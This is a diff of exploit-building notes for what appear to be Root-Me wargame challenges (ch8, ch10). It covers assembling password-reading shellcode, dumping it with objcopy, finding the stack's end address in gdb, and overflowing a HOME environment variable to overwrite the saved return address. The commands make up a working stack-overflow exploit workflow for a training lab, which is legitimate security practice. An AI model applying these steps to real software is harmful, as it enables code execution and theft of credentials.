@@ -1,4 +1,4 @@
-# instructions for generating exploit data
+# instructions for generating exploit command
 
 # shellcode assembly is in catpw.s!
 
@@ -8,23 +8,20 @@ nasm -f elf -o out.o catpw.s
 # dump shellcode
 objcopy --output-target=binary --only-section=.text out.o shell.bin
 
-# figure out where HOME env var will be using C program
-# using env -i to work in a clean environment!
-# compile program
-gcc -m32 -o env enc.c
-# get location
-env -i HOME=$(python gen_data.py) USERNAME= SHELL= PATH= ./env HOME ./ch8
-# (you would need to do this in /tmp or /var/tmp on the rootme server)
-# gen_data.py is not needed, we just need the HOME var to be the right size (128 * 4 + 32 + 8 bytes)
-# 128 * 4 = env struct
-# 32 = other stack data
-# 8 = two pointers (first will become eip!)
+# normally, we'd need to figure out where the ENV vars end up
+# but because of the "return env" in GetEnv() we copy the struct to somewhere
+# else on the stack before ret, and we control where the data gets copied!
+# this means we can copy the data to address X and jump directly to address X
+# address X can simply be = end of stack region - struct size
 
-# modify the gen_data script with the address!
+# we can get the end of the stack region with gdb:
+# gdb ./ch10
+# break main
+# run
+# info proc map
+# copy the "End Addr" column's value where objfile is [stack]!
+# and finally, modify the gen_data script with the address
 
 # generate data with python
-python3 gen_data.py > data
-
-# then run the program with data as the HOME env variable
-# eg:
-env -i HOME=$(python gen_data.py) USERNAME= SHELL= PATH= ./ch8
+# this will output a command you can run
+python3 gen_data.py
